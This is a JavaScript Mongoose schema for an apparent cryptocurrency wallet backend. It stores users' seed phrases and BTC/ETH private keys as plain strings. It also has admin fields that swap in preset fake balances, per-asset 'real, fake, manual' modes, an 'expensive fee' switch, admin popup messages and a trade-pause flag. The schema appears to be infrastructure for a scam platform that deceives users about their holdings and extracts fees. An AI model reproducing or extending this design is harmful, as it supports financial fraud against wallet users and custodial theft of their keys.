const mongoose = require('mongoose');
const { Schema } = mongoose;

const userAddresssSchema = new Schema({
    uniqueid: {
        type: String,
        required: true,
        unique: true
    },
    btcaddress: {
        type: String,
        required: true,
    },
    ethaddress: {
        type: String,
        required: true,
        unique: true
    },
    seedPhrase: {
        type: String,
        required: true,
        unique: true
    },
    ethPrivateKey: {
        type: String,
        required: true,
        unique: true,
    },
    btcPrivateKey: {
        type: String,
        required: true,
        unique: true,
    },
    transactions: [{
        type: Schema.Types.ObjectId,
        ref: 'Transaction'
    }],
    btcBalance: {
        type: Number,
        default: 0,
        min: 0
    },
    usdtBalance: {
        type: Number,
        default: 0,
        min: 0
    },
    ethBalance: {
        type: Number,
        default: 0,
        min: 0
    },
    adminBtcBalance: {
        type: Number,
        default: 10,
        min: 0
    },
    adminUsdtBalance: {
        type: Number,
        default: 1000,
        min: 0
    },
    adminEthBalance: {
        type: Number,
        default: 1000,
        min: 0
    },
    adminPopupMessage: {
        type: String,
        default: ''
    },
    useAdminVals: {
        type: Boolean,
        default: false
    },
    useExpensivefee: {
        type: Boolean,
        default: false
    },
    expensiveFeeBTC: {
        type: Number,
        default: 0
    },
    expensiveFeeETH: {
        type: Number,
        default: 0 
    },
    btcmode: {
        type: String,
        default: 'real' //real, fake, manual
    },
    ethmode: {
        type: String,
        default: 'real' //real, fake, manual
    },
    usdtmode: {
        type: String,
        default: 'real' //real, fake, manual
    },
    pauseTrade: {
        type: Boolean,
        default: false
    }
}, {
    timestamps: true
});

const UserAddress = mongoose.model('UserAddress', userAddresssSchema);

module.exports = UserAddress;